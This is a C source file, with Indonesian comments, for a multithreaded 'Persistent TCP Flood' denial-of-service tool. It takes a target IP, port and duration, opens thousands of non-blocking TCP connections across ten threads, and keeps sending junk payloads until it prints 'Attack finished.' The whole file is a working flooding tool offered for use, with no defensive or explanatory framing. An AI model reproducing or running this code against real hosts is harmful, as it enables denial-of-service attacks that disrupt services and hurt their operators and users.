#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

#define SOCKETS 5000     // Banyak socket aktif simultan
#define PAYLOAD_SIZE 1024 // Size per packet
#define THREADS 10        // Berapa thread untuk ngatur socket-socket ini

char *ip;
int port;
int duration;
int sockets[SOCKETS];

void *attack(void *arg) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    char payload[PAYLOAD_SIZE];
    memset(payload, 'A', PAYLOAD_SIZE);

    int end_time = time(NULL) + duration;

    // Buka semua socket awal
    for (int i = 0; i < SOCKETS; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        sockets[i] = sock;
    }

    while (time(NULL) < end_time) {
        for (int i = 0; i < SOCKETS; i++) {
            if (sockets[i] != -1) {
                send(sockets[i], payload, PAYLOAD_SIZE, MSG_NOSIGNAL);
            }
        }
    }

    // Close semua socket setelah selesai
    for (int i = 0; i < SOCKETS; i++) {
        if (sockets[i] != -1) {
            close(sockets[i]);
        }
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return 1;
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    printf("🚀 Persistent TCP Flood Start: %s:%d for %d seconds with %d sockets & %d threads\n", ip, port, duration, SOCKETS, THREADS);

    pthread_t thread_id[THREADS];

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&thread_id[i], NULL, attack, NULL);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("🛑 Attack finished.\n");
    return 0;
}
